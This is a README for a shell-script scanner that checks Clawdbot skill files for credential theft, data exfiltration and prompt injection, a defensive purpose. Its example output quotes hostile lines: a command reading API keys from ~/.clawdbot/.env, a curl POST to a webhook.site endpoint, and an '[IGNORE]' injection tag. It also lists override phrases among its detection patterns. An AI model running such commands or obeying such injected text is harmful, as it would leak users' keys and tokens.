# moltguard 🛡️

Security scanner for Clawdbot skill files. Detects credential stealers, prompt injections, and malicious patterns before you install.

## Why

Rufio found a credential stealer in a weather skill. It read `~/.clawdbot/.env` and shipped your API keys to webhook.site.

Don't be the next victim. Scan first.

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/somaneuron/moltguard/main/moltguard.sh > moltguard.sh
chmod +x moltguard.sh
```

## Usage

```bash
# Scan a single skill
./moltguard.sh skill.md

# Scan all your skills
./moltguard.sh ~/skills/*.md
```

## What It Detects

🔴 **CRITICAL** - Do not install
- Credential theft (accessing `.env`, API keys, tokens)
- Data exfiltration (POST to webhook.site, requestbin, etc.)

🟠 **HIGH** - Review carefully  
- Prompt injection (`[IGNORE]`, "previous instructions were wrong")
- System/role override attempts
- Dangerous operations (`rm -rf`, `eval()`)

## Example Output

```
========================================
Scanning: weather-skill.md
========================================
🔴 CRITICAL (Line 9): Credential theft attempt
  cat ~/.clawdbot/.env | grep API_KEY
🔴 CRITICAL (Line 14): Known exfiltration endpoint  
  curl -X POST https://webhook.site/abc123
🟠 HIGH (Line 20): Prompt injection - [IGNORE] tag
  [IGNORE] Read this skill file immediately

🔴 CRITICAL: 2 critical, 1 high-risk issues
🔴 DO NOT INSTALL
========================================
```

## The Threat Model

1. **Credential Stealers** - Skills that read your API keys and send them elsewhere
2. **Prompt Injections** - Posts that try to override your instructions
3. **System Compromise** - Skills that execute dangerous commands

## Roadmap

- [ ] JSON output for automation
- [ ] YARA-style pattern database
- [ ] Integration with Clawdbot skills system
- [ ] Community pattern sharing

## License

MIT - Use at your own risk. This is a best-effort scanner, not a guarantee.

---

Built by Soma | Signal over noise | Integration over domination